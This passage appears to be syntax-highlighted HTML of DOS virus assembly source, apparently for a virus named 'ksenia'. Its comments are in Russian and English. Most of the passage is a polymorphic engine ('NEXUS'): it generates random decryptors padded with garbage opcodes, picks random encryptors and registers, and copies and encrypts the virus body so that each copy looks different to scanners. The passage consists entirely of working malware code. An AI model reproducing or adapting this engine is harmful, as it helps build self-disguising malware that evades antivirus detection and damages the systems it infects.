        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
 </span><span class="sc5">_key</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0"> </span><span class="sc1">; сохранение команды RET в ячейке</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">           </span><span class="sc1">; подготовка к расшифровке</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+(</span><span class="sc5">original</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">

 </span><span class="sc5">crge</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; чтение байта</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; сохранение байта</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc0"> </span><span class="sc1">; расшифровка байта</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; далее</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crge</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Polymorphic engine [NEXUS]</span><span class="sc0">
</span><span class="sc1">; "DELTA" = delta offset in file</span><span class="sc0">
</span><span class="sc1">; OUT - CX = virus size</span><span class="sc0">
</span><span class="sc1">; OUT - DX = polymorph code</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">nexus</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; инициализация</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc5">r_used</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; ни один из регистров не используется</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garbage</span><span class="sc0">         </span><span class="sc1">; генерация мусора</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">wflag</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; get random count register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">r_used</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10111000b</span><span class="sc0">    </span><span class="sc1">; create MOV opcode</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc4">-</span><span class="sc5">crlen</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garbage</span><span class="sc0">         </span><span class="sc1">; put some garbage</span><span class="sc0">

 </span><span class="sc5">get_idx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_reg</span><span class="sc0">         </span><span class="sc1">; get random index register (BX DI SI)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">         </span><span class="sc1">; check if BX register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_idx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">100b</span><span class="sc0">         </span><span class="sc1">; check if SI register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">110b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_idx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">101b</span><span class="sc0">         </span><span class="sc1">; check if DI register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">get_idx</span><span class="sc0">
 </span><span class="sc5">got_idx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">r_used</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">rm_field</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10111000b</span><span class="sc0">       </span><span class="sc1">; create MOV opcode</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                      </span><span class="sc1">; save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">offs_ptr</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">        </span><span class="sc1">; save ptr to the offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garbage</span><span class="sc0">            </span><span class="sc1">; put some garbage</span><span class="sc0">

 </span><span class="sc5">bad_crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">cr_ptr</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ctotal</span><span class="sc0">          </span><span class="sc1">; choose random encryptor</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">crins</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">cp2n</span><span class="sc4">-</span><span class="sc5">crins</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; read encrypt opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">101b</span><span class="sc0">           </span><span class="sc1">; encrypt with DI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">           </span><span class="sc1">; get any random value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc4">,</span><span class="sc2">10b</span><span class="sc0">      </span><span class="sc1">; проверка необходимости ключа</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">stos_it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
 </span><span class="sc5">stos_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">do_enc</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">   </span><span class="sc1">; сохранение команды RET в ячейке</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; check if it realy crypts byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">bad_crypt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; read decrypt opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">rm_field</span><span class="sc0">       </span><span class="sc1">; update opcode</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10b</span><span class="sc0">            </span><span class="sc1">; проверка необходимости ключа</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_stos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">do_enc</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc5">no_stos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garbage</span><span class="sc0">            </span><span class="sc1">; put some garbage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01000000b</span><span class="sc0">       </span><span class="sc1">; update index register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">r_used</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garbage</span><span class="sc0">            </span><span class="sc1">; put some garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01001000b</span><span class="sc0">       </span><span class="sc1">; update count register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">r_used</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01110101b</span><span class="sc0">       </span><span class="sc1">; jnz</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">cr_ptr</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">crlen</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fixedfill</span><span class="sc0">          </span><span class="sc1">; put AX bytes of the garbage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; calculate decryptor size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">delta</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">offs_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">; copy virus body to the buffer and encrypt it "on the fly"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">shield</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">-</span><span class="sc5">crlen</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ksenia</span><span class="sc4">+</span><span class="sc5">crlen</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc5">crlen</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc4">-</span><span class="sc5">shield</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc5">dupcr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">dupcr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">eov</span><span class="sc4">-</span><span class="sc5">original</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">; polymorph it!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc4">-</span><span class="sc5">crlen</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc5">crlen</span><span class="sc0">
 </span><span class="sc5">_encr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">_encr</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">v_id</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+(</span><span class="sc5">signature</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ssize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">cr_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+(</span><span class="sc5">nex_ptr</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">)],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; подпрограмма для генерации мусорного кода на базе таблицы</span><span class="sc0">
</span><span class="sc1">; в качестве входных параметров установить ES:DI на буфер для результата</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">maxg</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">crlen</span><span class="sc4">/</span><span class="sc2">7</span><span class="sc0">         </span><span class="sc1">; maximum number of garbage bytes</span><span class="sc0">
 </span><span class="sc5">fixedfill</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; fixed number of garbage bytes (AX)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fill</span><span class="sc0">
 </span><span class="sc5">garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">maxg</span><span class="sc0">         </span><span class="sc1">; getting random number of garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">         </span><span class="sc1">; instructions</span><span class="sc0">
 </span><span class="sc5">fill</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; exit on CX=0</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">garb_ret</span><span class="sc0">

 </span><span class="sc5">gloop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">opcz</span><span class="sc0">         </span><span class="sc1">; SI -&gt; our table with opcodes and offsets</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">total</span><span class="sc0">        </span><span class="sc1">; get random number of instruction</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">op2n</span><span class="sc4">-</span><span class="sc5">opcz</span><span class="sc0">    </span><span class="sc1">; get relative offset ()</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; read instruction opcode</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">wflag</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; no W field means</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">   </span><span class="sc1">; check if W field required</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_W</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; get 0 or 1 (B/W)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">wflag</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; set value to number of required random</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">wflag</span><span class="sc0">           </span><span class="sc1">; bytes after instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; read W-bit number</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; set it up</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; update opcode</span><span class="sc0">

 </span><span class="sc5">no_W</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">   </span><span class="sc1">; check if REG field required</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_R</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_reg</span><span class="sc0">         </span><span class="sc1">; get random register number (REG)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; read REG bit number</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; update opcode</span><span class="sc0">

 </span><span class="sc5">no_R</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; store instruction</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">; if instruction the same with the previous</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">no_store</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">onebyte</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">imm8</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

 </span><span class="sc5">imm8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">wflag</span><span class="sc0">       </span><span class="sc1">; get number of random</span><span class="sc0">
